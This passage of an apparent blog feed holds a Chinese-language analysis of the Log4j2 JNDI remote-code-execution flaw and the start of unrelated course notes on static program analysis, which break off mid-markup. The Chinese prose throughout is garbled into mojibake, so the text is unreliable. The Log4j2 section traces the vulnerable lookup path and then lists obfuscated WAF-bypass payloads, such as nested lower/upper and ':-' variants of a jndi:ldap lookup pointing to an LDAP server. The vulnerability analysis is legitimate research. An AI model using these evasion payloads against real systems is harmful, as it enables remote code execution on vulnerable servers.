ç¬¬8æ¬¡å¾ªç¯çš„converterå®ç°ä¸ºMessagePatternConverterç±»ï¼Œè·Ÿå…¥</span></span><br><span class="line">        <span class="keyword">this</span>.converter.format(event, buf);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.formatWithInfo(event, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†çœ‹çœ‹<code>MessagePatternConverter</code>ä¸­çš„<code>format</code>å®ç°ï¼Œåœ¨åˆ¤æ–­logå†…å®¹åŒ…å«<code>$&#123;</code>åï¼Œå°†<code>evet</code>å¸¦å…¥çš„<code>replace</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder toAppendTo)</span> </span>&#123;</span><br><span class="line">    Message msg = event.getMessage();</span><br><span class="line">    <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> StringBuilderFormattable) &#123;</span><br><span class="line">        <span class="keyword">boolean</span> doRender = <span class="keyword">this</span>.textRenderer != <span class="keyword">null</span>;</span><br><span class="line">        StringBuilder workingBuilder = doRender ? <span class="keyword">new</span> StringBuilder(<span class="number">80</span>) : toAppendTo;</span><br><span class="line">        <span class="keyword">int</span> offset = workingBuilder.length();</span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> MultiFormatStringBuilderFormattable) &#123;</span><br><span class="line">            ((MultiFormatStringBuilderFormattable)msg).formatTo(<span class="keyword">this</span>.formats, workingBuilder);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ((StringBuilderFormattable)msg).formatTo(workingBuilder);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.config != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.noLookups) &#123;  <span class="comment">// 2.14.1åŠä¸€ä¸‹ç‰ˆæœ¬çš„noLookupsé»˜è®¤ä¸ºfalse</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = offset; i &lt; workingBuilder.length() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">                <span class="comment">// åˆ¤æ–­logå†…å®¹æ˜¯å¦åŒ…å«&#x27;$&#123;&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                    String value = workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                    workingBuilder.setLength(offset);</span><br><span class="line">                    <span class="comment">// è·Ÿå…¥replaceæ–¹æ³•</span></span><br><span class="line">                    workingBuilder.append(<span class="keyword">this</span>.config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>org.apache.logging.log4j.core.util.Constants</code>ç±»ä¸­å¯ä»¥çœ‹åˆ°noLookpusé»˜è®¤ä¸ºfalse</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">boolean</span> FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS = PropertiesUtil.getProperties().getBooleanProperty(<span class="string">&quot;log4j2.formatMsgNoLookups&quot;</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦æ›¿æ¢"><a href="#å­—ç¬¦æ›¿æ¢" class="headerlink" title="å­—ç¬¦æ›¿æ¢"></a>å­—ç¬¦æ›¿æ¢</h3><p>è·Ÿå…¥<code>org.apache.logging.log4j.core.lookup.StrSubstitutor</code>ç±»çš„<code>replace</code>æ–¹æ³•ï¼Œé‡Œé¢è°ƒç”¨<code>StrSubstitutor</code>ç±»çš„<code>substitute</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">replace</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String source)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (source == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        StringBuilder buf = <span class="keyword">new</span> StringBuilder(source);</span><br><span class="line">        <span class="comment">// è·Ÿå…¥</span></span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">this</span>.substitute(event, buf, <span class="number">0</span>, source.length()) ? source : buf.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">substitute</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf, <span class="keyword">final</span> <span class="keyword">int</span> offset, <span class="keyword">final</span> <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.substitute(event, buf, offset, length, (List)<span class="keyword">null</span>) &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€çœ‹çœ‹<code>StrSubstitutor</code>ç±»ï¼Œå®šä¹‰äº†ä¸€äº›ç±»å‹ä¸º<code>org.apache.logging.log4j.core.lookup.StrMatcher</code>çš„æˆå‘˜å˜é‡ï¼Œå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">char</span> DEFAULT_ESCAPE = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_PREFIX = StrMatcher.stringMatcher(<span class="string">&quot;$&#123;&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_SUFFIX = StrMatcher.stringMatcher(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_VALUE_DELIMITER_STRING = <span class="string">&quot;:-&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_VALUE_DELIMITER = StrMatcher.stringMatcher(<span class="string">&quot;:-&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ESCAPE_DELIMITER_STRING = <span class="string">&quot;:\\-&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_VALUE_ESCAPE_DELIMITER = StrMatcher.stringMatcher(<span class="string">&quot;:\\-&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç†è§£<code>StrMatcher</code>ç±»ä¸º<code>log4j</code>å†…ç½®çš„å­—ç¬¦åŒ¹é…å™¨ï¼Œå…ˆçœ‹ä¸‹è¯¥ç±»çš„<code>isMath</code>æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯æŒ‡å®šä¸€ä¸ªcharæ•°ç»„çš„èµ·å§‹ä½ç½®å’ŒåŒ¹é…é•¿åº¦å»åŒ¹é…å¦ä¸€ä¸ªcharæ•°ç»„ï¼Œè‹¥å®Œå…¨åŒ¹é…ä¸Šåˆ™è¿”å›åŒ¹é…ä¸Šçš„é•¿åº¦ï¼Œæ²¡åŒ¹é…ä¸Šè¿”å›<code>0</code>ï¼Œè¯¥æ–¹æ³•åœ¨æ¥ä¸‹æ¥çš„<code>substitute</code>æ–¹æ³•ä¸­ä¼šç”¨åˆ°è¾ƒå¤šï¼Œæ‰€ä»¥è¿™é‡Œæä¸€ä¸‹</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123190427560.png" class="" title="image-20220123174526935"><p>æ¥ä¸‹æ¥çœ‹<code>StrSubstitutor</code>ç±»çš„<code>substitute</code>ï¼Œè¯¥æ–¹æ³•å°±æ˜¯æœ¬æ¬¡æ¼æ´è§¦å‘çš„å…³é”®æ–¹æ³•</p><p>å…ˆwhileå¾ªç¯å»åŒ¹é…å­—ç¬¦ä¸²ä¸­çš„å‰ç¼€å­—ç¬¦<code>$&#123;</code></p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123192824964.png" class="" title="image-20220123192824964"><p>æ¥ç€å°†å‰ç¼€<code>$&#123;</code>åé¢çš„å­—ç¬¦ä¸²é€šè¿‡whileå¾ªç¯åŒ¹é…åç¼€<code>&#125;</code>ï¼Œåœ¨whileå¾ªç¯ä¸­åŒ¹é…åç¼€ä¹‹å‰ï¼Œä¼šå…ˆåˆ¤æ–­å‰©ä¸‹çš„å­—ç¬¦ä¸²æ˜¯å¦è¿˜å­˜åœ¨å‰ç¼€ï¼Œæ¯åŒ¹é…ä¸€æ¬¡å‰ç¼€åˆ™<code>nestedVarCount</code>åŠ ä¸€ï¼Œå½“è¯¥å˜é‡ä¸ä¸º<code>0</code>ä¸”åŒ¹é…ä¸­ä¸€æ¬¡åç¼€<code>&#125;</code>ä¼šå‡ä¸€ï¼Œé€šè¿‡è¯¥å˜é‡æ¥åŒ¹é…å‡ºæœ€å¤–å±‚<code>$&#123;&#125;</code>åŒ…è£¹çš„è¡¨è¾¾å¼ï¼Œç„¶åå°†åŒ¹é…åçš„è¡¨è¾¾å¼ç»§ç»­å¾€ä¸‹é€’å½’ï¼Œä»¥æ»¡è¶³åµŒå¥—çš„åœºæ™¯</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123194612458.png" class="" title="image-20220123194612458"><p>æ¥ç€åˆ¤æ–­æ˜¯å¦åŒ…å«<code>:-</code>å’Œ<code>:\-</code>åˆ†å‰²ç¬¦ï¼Œç„¶ååšä¸€äº›åˆ†å‰²å¤„ç†ï¼ˆå˜å½¢æ€è·¯1ï¼‰ï¼Œè¿™é‡Œåˆ¤æ–­è¾ƒå¤šï¼Œå°±ä¸æŒ¨ä¸ªæè¿°ï¼Œç®€å•æ¦‚æ‹¬ä¸º</p><ul><li><code>:-</code> æ˜¯ä¸€ä¸ªåˆ†å‰²ç¬¦ï¼Œå¦‚æœç¨‹åºå¤„ç†åˆ° <code>$&#123;aaaa:-bbbb&#125;</code> è¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œå¤„ç†çš„ç»“æœå°†ä¼šæ˜¯ <code>bbbb</code>ï¼Œ<code>:-</code> å…³é”®å­—å°†ä¼šè¢«æˆªå–æ‰ï¼Œè€Œä¹‹å‰çš„å­—ç¬¦ä¸²éƒ½ä¼šè¢«èˆå¼ƒæ‰ã€‚</li><li><code>:\-</code> æ˜¯è½¬ä¹‰çš„ <code>:-</code>ï¼Œå¦‚æœä¸€ä¸ªç”¨ <code>a:b</code> è¡¨ç¤ºçš„é”®å€¼å¯¹çš„ key <code>a</code> ä¸­åŒ…å« <code>:</code>ï¼Œåˆ™éœ€è¦ä½¿ç”¨è½¬ä¹‰æ¥é…åˆå¤„ç†ï¼Œä¾‹å¦‚ <code>$&#123;aaa:\\-bbb:-ccc&#125;</code>ï¼Œä»£è¡¨ key æ˜¯ï¼Œ<code>aaa:bbb</code>ï¼Œvalue æ˜¯ <code>ccc</code>ã€‚</li></ul><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123203000204.png" class="" title="image-20220123203000204"><p>åœ¨æ²¡æœ‰åŒ¹é…ä¸Šåˆ†éš”ç¬¦æˆ–åˆ†å‰²å¤„ç†å®Œåï¼Œä¼šè°ƒç”¨<code>resolveVariable</code>æ–¹æ³•è¿›è¡Œè§£æï¼Œå°†è¿”å›çš„ç»“æœæ›¿æ¢å›åŸå­—ç¬¦ä¸²åï¼Œå†æ¬¡è°ƒç”¨ <code>substitute</code> æ–¹æ³•è¿›è¡Œé€’å½’è§£æ</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210610548.png" class="" title="image-20220123210610548"><h3 id="Lookup"><a href="#Lookup" class="headerlink" title="Lookup"></a>Lookup</h3><p><code>resolveVariable</code>æ–¹æ³•ä¼šè°ƒç”¨<code>resolver</code>è§£æå™¨çš„<code>lookup</code>æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œ<code>resolver</code>æ”¯æŒ12ç§ç±»å‹çš„<code>lookup</code>å®ç°ï¼ˆå˜å½¢æ€è·¯2ï¼‰</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123204742879.png" class="" title="image-20220123204742879"><p>æ¥ç€è·Ÿå…¥<code>lookup</code>æ–¹æ³•ï¼Œæ¥åˆ°äº†<code>org.apache.logging.log4j.core.lookup.Interpolator</code>æ‹¦æˆªå™¨ï¼Œè¯¥æ‹¦æˆªå™¨é€šè¿‡ä¸åŒå‰ç¼€åˆ†é…å¯¹åº”çš„<code>lookup</code>æ–¹æ³•å®ç°</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210035434.png" class="" title="image-20220123210035434"><p>ç»§ç»­è·Ÿè¿›<code>lookup</code>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬ä¼ å…¥çš„æ˜¯jndiå‰ç¼€ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨<code>org.apache.logging.log4j.core.lookup.JndiLookup</code>çš„<code>lookup</code>æ–¹æ³•ï¼Œåˆ°è¿™å°±è§¦å‘æ¼æ´äº†ã€‚</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210252342.png" class="" title="image-20220123210252342"><h2 id="0x02-payloadå˜å½¢æ€è·¯"><a href="#0x02-payloadå˜å½¢æ€è·¯" class="headerlink" title="0x02 payloadå˜å½¢æ€è·¯"></a>0x02 payloadå˜å½¢æ€è·¯</h2><h3 id="å¢åŠ -å¹²æ‰°"><a href="#å¢åŠ -å¹²æ‰°" class="headerlink" title="å¢åŠ :-å¹²æ‰°"></a>å¢åŠ <code>:-</code>å¹²æ‰°</h3><p>ä¸Šé¢è¯´åˆ°å½“å­—ç¬¦ä¸²ç§åŒ…å«<code>:-</code>å’Œ<code>:\-</code>ä¼šåšä¸€äº›å¤„ç†ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¯¥å¤„ç†é€»è¾‘æ¥å˜å½¢ç»•è¿‡ä¸€äº›wafï¼Œä¾‹å¦‚<code>$&#123;$&#123;p0melo:-j&#125;ndi:ldap://127.0.0.1:1389/kk2err&#125;</code></p><h3 id="åµŒå¥—å…¶ä»–åè®®"><a href="#åµŒå¥—å…¶ä»–åè®®" class="headerlink" title="åµŒå¥—å…¶ä»–åè®®"></a>åµŒå¥—å…¶ä»–åè®®</h3><p>ä¸Šé¢åˆ†æä¸­å¯ä»¥çœ‹åˆ°<code>StrLookup</code>é™¤äº†æ”¯æŒjndiåè®®è¿˜æ”¯æŒ<code>&#123;date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j&#125;</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡å…¶ä»–åè®®å˜å½¢payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;lower:j&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;di:$&#123;lower::::l&#125;dap:<span class="comment">//127.0.0.1:1389/kk2err&#125; // å¯ä»¥åµŒå¥—å¤šä¸ª</span></span><br></pre></td></tr></table></figure><h3 id="ç»„åˆ"><a href="#ç»„åˆ" class="headerlink" title="ç»„åˆ"></a>ç»„åˆ</h3><p>å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç»„åˆä¸Šé¢ä¸¤ç§æ€è·¯ï¼Œä¾‹å¦‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;lower:$&#123;p0melo:-j&#125;&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br><span class="line">$&#123;$&#123;p0melo:-$&#123;lower:J&#125;&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br></pre></td></tr></table></figure><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123221821111.png" class="" title="image-20220123221821111">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šé™æ€ç¨‹åºåˆ†æï¼ˆå—äº¬å¤§å­¦ï¼‰ã€‹è¯¾ç¨‹ç¬”è®°</title>
      <link href="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>æ³¨ï¼šâ­ï¸ç¬¦å·ä»£è¡¨é‡è¦çš„çŸ¥è¯†ç‚¹ï¼Œè¯¾ç¨‹è¿˜æœªå­¦ä¹ å®Œï¼Œç¬”è®°æ›´æ–°ä¸­ing</p><h2 id="1-Intermediate-Representation-IR-ï¼ˆç¬¬äºŒèŠ‚è¯¾ï¼‰"><a href="#1-Intermediate-Representation-IR-ï¼ˆç¬¬äºŒèŠ‚è¯¾ï¼‰" class="headerlink" title="1. Intermediate Representation(IR)ï¼ˆç¬¬äºŒèŠ‚è¯¾ï¼‰"></a>1. Intermediate Representation(IR)ï¼ˆç¬¬äºŒèŠ‚è¯¾ï¼‰</h2><h3 id="1-1-AST-VS-IR"><a href="#1-1-AST-VS-IR" class="headerlink" title="1.1 AST VS IR"></a>1.1 AST VS IR</h3><p>ç¼–è¯‘å™¨è¿è¡Œæµç¨‹</p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185425580.png" class="" title="image-20220103185425580"><p>ç¨‹åºåˆ°é™æ€åˆ†æçš„æµç¨‹ç†è§£ï¼š<strong>ç¨‹åº-&gt;IR(3addr 3åœ°å€ç )-&gt;CFG-&gt;é™æ€åˆ†æ</strong></p><p>ASTä¸IRçš„åŒºåˆ«</p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185553431.png" class="" title="image-20220103185553431"><h3 id="1-2-What-IR-Sootâ€™s-IR-Jimple"><a href="#1-2-What-IR-Sootâ€™s-IR-Jimple" class="headerlink" title="1.2 What IR(Sootâ€™s IR:Jimple)"></a>1.2 What IR(Sootâ€™s IR:Jimple)</h3><p><strong>demo1:do while loop</strong></p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185733224.png" class="" title="image-20220103185733224"><p><strong>demo2:method call</strong></p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185756327.png" class="" title="image-20220103185756327"><p><strong>demo3:class</strong></p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185813310.png" class="" title="image-20220103185813310"><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185825140.png" class="" title="image-20220103185825140"><h3 id="1-3-Control-Flow-Graph-CFG"><a href="#1-3-Control-Flow-Graph-CFG" class="headerlink" title="1.3 Control Flow Graph(CFG)"></a>1.3 Control Flow Graph(CFG)</h3><h4 id="1-3-1-graph-nodes-basiï¼Œc-blocks-BB"><a href="#1-3-1-graph-nodes-basiï¼Œc-blocks-BB" class="headerlink" title="1.3.1 graph nodes : basiï¼Œc blocks(BB)"></a>1.3.1 graph nodes : basiï¼Œc blocks(BB)</h4><h5 id="Basic-Blockså®šä¹‰"><a href="#Basic-Blockså®šä¹‰" class="headerlink" title="Basic Blockså®šä¹‰"></a><strong>Basic Blockså®šä¹‰</strong></h5><p>å…¥å£å’Œå‡ºå£éƒ½æ˜¯å”¯ä¸€çš„æœ€å¤§3åœ°å€ç é¡ºåºé›†åˆ</p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103190319354.png" class="" title="image-20220103190319354"><h5 id="â­ï¸åˆ¤åˆ«Basic-Blocksæ–¹æ³•"><a href="#â­ï¸åˆ¤åˆ«Basic-Blocksæ–¹æ³•" class="headerlink" title="â­ï¸åˆ¤åˆ«Basic Blocksæ–¹æ³•"></a>â­ï¸<strong>åˆ¤åˆ«Basic Blocksæ–¹æ³•</strong></h5><p><strong>step1 ï¼šå…ˆæ‰¾åˆ°æ‰€æœ‰BBçš„å…¥å£(leaders)ï¼Œå¯é€šè¿‡ä¸‹é¢3ä¸­æ–¹æ³•åˆ¤å®š</strong></p><ul><li><strong>ç¨‹åºä¸­çš„ç¬¬ä¸€æ¡æŒ‡ä»¤</strong></li><li><strong>ä»»ä½•è¢«jump (goto) åˆ°çš„ç›®æ ‡éƒ½ä¸ºleader</strong></li><li><strong>ä»»ä½•ç´§è·Ÿjumpè¯­å¥åçš„è¯­å¥éƒ½ä¸ºleader</strong></li></ul><p><strong>step2ï¼šä¸€ä¸ªleaderå’Œåé¢çš„æ‰€æœ‰æŒ‡ä»¤ï¼Œç›´åˆ°ä¸‹ä¸€ä¸ªleaderä¸ºæ­¢</strong></p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103193220938.png" class="" title="image-20220103193220938"><h5 id="ä¾‹å­ï¼š3ACè½¬æ¢BBs"><a href="#ä¾‹å­ï¼š3ACè½¬æ¢BBs" class="headerlink" title="ä¾‹å­ï¼š3ACè½¬æ¢BBs"></a><strong>ä¾‹å­ï¼š3ACè½¬æ¢BBs</strong></h5><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103195204869.png" class="" title="image-20220103195204869"><h4 id="1-3-2-Graph-edge"><a href="#1-3-2-Graph-edge" class="headerlink" title="1.3.2 Graph edge"></a>1.3.2 Graph edge</h4><h5 id="â­ï¸å¦‚ä½•ç»™BBsåŠ è¾¹"><a href="#â­ï¸å¦‚ä½•ç»™BBsåŠ è¾¹" class="headerlink" title="â­ï¸å¦‚ä½•ç»™BBsåŠ è¾¹"></a>â­ï¸å¦‚ä½•ç»™BBsåŠ è¾¹</h5><p><strong>1.ä¸ç®¡æœ‰æ— æ¡ä»¶çš„jumpï¼Œèµ·ç‚¹ä¸ç›®æ ‡çš„è¿çº¿</strong></p><p><strong>2.æ­£å¸¸çš„æ— æ¡ä»¶æŒ‡ä»¤ï¼ŒæŒ‰æ‰§è¡Œé¡ºåºä¾æ¬¡è¿çº¿</strong></p><p><strong>3.ç¬¬1æ¡çš„è¿çº¿ç”¨jumpæŒ‡ä»¤æ‰€åœ¨çš„BBè¿çº¿ä»£æ›¿ï¼Œå¦‚ä¸‹å›¾Aä¸B</strong></p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103200344933.png" class="" title="image-20220103200344933"><h5 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h5><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103201711683.png" class="" title="image-20220103201711683"><h2 id="2-Data-Flow-Analysis-Applications-ï¼ˆç¬¬ä¸‰ã€å››èŠ‚è¯¾ï¼‰"><a href="#2-Data-Flow-Analysis-Applications-ï¼ˆç¬¬ä¸‰ã€å››èŠ‚è¯¾ï¼‰" class="headerlink" title="2.  Data Flow Analysis - Applications ï¼ˆç¬¬ä¸‰ã€å››èŠ‚è¯¾ï¼‰"></a>2.  Data Flow Analysis - Applications ï¼ˆç¬¬ä¸‰ã€å››èŠ‚è¯¾ï¼‰</h2><p>ä¸‹é¢ä»‹ç»3é’Ÿä¸åŒçš„æ•°æ®æµåˆ†æç®—æ³•ï¼Œé€šè¿‡ç®—æ³•å¯ä»¥è§£å‡ºCFGå¯æµé€šçš„è·¯å¾„ï¼Œç®—æ³•ä¸åŒï¼Œè·¯å¾„ç»“æœä¹Ÿä¸åŒ</p><h3 id="2-1-å‰ç½®çŸ¥è¯†"><a href="#2-1-å‰ç½®çŸ¥è¯†" class="headerlink" title="2.1 å‰ç½®çŸ¥è¯†"></a>2.1 å‰ç½®çŸ¥è¯†</h3><img 